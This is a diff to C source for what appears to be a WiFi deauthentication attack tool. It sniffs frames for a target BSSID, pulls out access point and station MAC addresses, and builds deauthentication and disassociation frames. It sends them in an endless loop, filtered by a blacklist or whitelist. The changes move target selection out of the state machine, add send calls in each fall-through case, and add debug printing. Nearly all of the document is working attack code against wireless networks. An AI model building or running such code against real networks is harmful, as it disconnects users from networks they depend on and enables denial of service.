@@ -27,9 +27,10 @@ struct packet
     int length;
 } packet;
 
-
 int send_packet(uchar *buf, size_t count)
 {
+    printf("\nsending_packet\n");
+    print_packet(buf, count);
     struct wif *wi = _wi_out; /* XXX */
     if (wi_write(wi, buf, count, NULL) == -1) {
         switch (errno) {
@@ -78,8 +79,6 @@ void print_mac(const uchar* mac) {
     }
     printf("\n");
 }
-
-
 
 struct packet create_deauth_frame(uchar *mac_source, uchar *mac_destination, uchar *mac_bssid, int disassoc)
 {
@@ -413,31 +412,41 @@ uchar *get_target_deauth(uchar *bssid)
     int t;
     // Sniffing for data frames to find targets
     int packet_length = 0;
-    int first = 1;
     while (1)
     {
         packet_length = 0;
-        while (
-                packet_length < 22
-                ||
-                (
-                    !first
-                    &&
-                    (
-                        memcmp(bssid, get_macs_from_packet('b', sniffed_packet, &t), MAC_LENGTH)
-                        &&
-                        memcmp(bssid, get_macs_from_packet('a', sniffed_packet, &t), MAC_LENGTH)
-                        &&
-                        memcmp(bssid, get_macs_from_packet('s', sniffed_packet, &t), MAC_LENGTH)
-                    )
-                )
-            )
-        {
-            first = 0;
+        do {
+            /*int to_print = 0;*/
+            /*if (*/
+                /*memcmp(bssid, get_macs_from_packet('b', sniffed_packet, &t), MAC_LENGTH) &&*/
+                /*memcmp(mac_list[0], get_macs_from_packet('s', sniffed_packet, &t), MAC_LENGTH)*/
+            /*) {*/
+                /*to_print = 1;*/
+            /*}*/
+
             packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);
-        }
+
+            /*if (to_print) {*/
+                /*print_packet(sniffed_packet, packet_length);*/
+                /*printf("packet_length: %d\n", packet_length);*/
+                /*printf("\n===========================================================\n");*/
+            /*}*/
+            if (!memcmp(bssid, get_macs_from_packet('b', sniffed_packet, &t), MAC_LENGTH))
+            {
+                break;
+            }
+            if (!memcmp(bssid, get_macs_from_packet('a', sniffed_packet, &t), MAC_LENGTH))
+            {
+                break;
+            }
+            if (!memcmp(bssid, get_macs_from_packet('s', sniffed_packet, &t), MAC_LENGTH))
+            {
+                break;
+            }
+        } while(1);
+
         // \x08 - Beacon
-        if (memcmp(sniffed_packet, "\x08", 1))
+        if (!memcmp(sniffed_packet, "\x08", 1))
         {
             return sniffed_packet;
         }
@@ -447,55 +456,82 @@ uchar *get_target_deauth(uchar *bssid)
 struct packet get_deauth_packet(int *state, uchar *bssid)
 {
     uchar * sniffed_packet_data = NULL;
-    int is_wds = 0;
     uchar * mac_access_point = NULL;
     uchar * mac_bssid = NULL;
     uchar * mac_station = NULL;
+    int is_wds = 0;
     struct packet result_packet;
+    printf("\nstate: %d\n", *state);
+    while(1)
+    {
+        sniffed_packet_data = get_target_deauth(bssid);
+        mac_access_point = get_macs_from_packet('a', sniffed_packet_data, &is_wds);
+        mac_station = get_macs_from_packet('s', sniffed_packet_data, &is_wds);
+        mac_bssid = get_macs_from_packet('b', sniffed_packet_data, &is_wds);
+
+        if (
+                (use_list == 1 && is_in_list(mac_access_point) && is_in_list(mac_station))
+                ||
+                (use_list == 2 && !(is_in_list(mac_access_point) || is_in_list(mac_station)))
+            )
+        {
+                continue;
+        }
+        break;
+    }
+    printf("\n\n======================================================================\n\n");
+    printf("expected: ");
+    print_mac(bssid);
+    printf("should ban: ");
+    print_mac(mac_list[0]);
+    printf("bssid: ");
+    print_mac(mac_bssid);
+    printf("access_point: ");
+    print_mac(mac_access_point);
+    printf("mac_station: ");
+    print_mac(mac_station);
+
     switch (*state)
     {
     case 0:
-        while(1)
-        {
-            sniffed_packet_data = get_target_deauth(bssid);
-            mac_access_point = get_macs_from_packet('a', sniffed_packet_data, &is_wds);
-            mac_station = get_macs_from_packet('s', sniffed_packet_data, &is_wds);
-            mac_bssid = get_macs_from_packet('b', sniffed_packet_data, &is_wds);
-            if (
-                    (use_list == 1 && !is_in_list(mac_access_point) && !is_in_list(mac_station))
-                    ||
-                    (use_list == 2 && (is_in_list(mac_access_point) || is_in_list(mac_station)))
-                )
-            {
-                    continue;
-            }
-
-            *state = 1;
-            result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 1);
-        }
+        *state = 1;
+        result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 1);
+        send_packet(result_packet.data, result_packet.length);
     case 1:
+        printf("\nstate: %d\n", *state);
         *state = 2;
         if (is_wds)
         {
             *state = 4;
         }
         result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 0);
+        send_packet(result_packet.data, result_packet.length);
     case 2:
+        printf("\nstate: %d\n", *state);
         *state = 3;
         result_packet = create_deauth_frame(mac_station, mac_access_point, mac_bssid, 1);
+        send_packet(result_packet.data, result_packet.length);
     case 3:
+        printf("\nstate: %d\n", *state);
         *state = 0;
         result_packet = create_deauth_frame(mac_station, mac_access_point, mac_bssid, 0);
+        send_packet(result_packet.data, result_packet.length);
     case 4:
+        printf("\nstate: %d\n", *state);
         *state = 5;
         result_packet = create_deauth_frame(mac_station, mac_bssid, mac_access_point, 1);
+        send_packet(result_packet.data, result_packet.length);
     case 5:
+        printf("\nstate: %d\n", *state);
         *state = 0;
         result_packet = create_deauth_frame(mac_station, mac_bssid, mac_access_point, 0);
+        send_packet(result_packet.data, result_packet.length);
     }
+
     free(sniffed_packet_data);
     return result_packet;
 }
+
 void print_help()
 {
     printf(
@@ -573,10 +609,28 @@ int main(int argc, const char *argv[])
     /* drop privileges */
     setuid(getuid());
 
+    if (use_list > 0)
+    {
+        if (use_list == 1)
+        {
+            printf("blacklist:\n");
+        } else if (use_list == 2)
+        {
+            printf("whitelist:\n");
+        }
+
+        int i = 0;
+        for (i = 0; i < mac_list_length; i++)
+        {
+            print_mac(mac_list[i]);
+        }
+    }
+
     /* Run Forest, run... */
     while (1)
     {
         packet_to_send = get_deauth_packet(&state, bssid);
+
         send_packet(packet_to_send.data, packet_to_send.length);
         /* we shall print some statistics */
     }
